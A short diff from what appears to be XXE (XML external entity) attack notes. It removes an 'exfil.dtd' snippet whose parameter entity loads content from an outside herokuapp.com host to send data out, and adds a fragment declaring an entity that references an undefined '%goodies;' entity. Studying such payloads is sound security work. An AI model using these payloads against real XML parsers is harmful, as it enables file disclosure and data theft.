@@ -1,5 +1,2 @@
-    **exfil.dtd**
-
-    ```xml
-<!ENTITY % data SYSTEM "https://pacific-retreat-98103.herokuapp.com/koll">
-<!ENTITY exfil "%data;">
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY xxe "%goodies;">
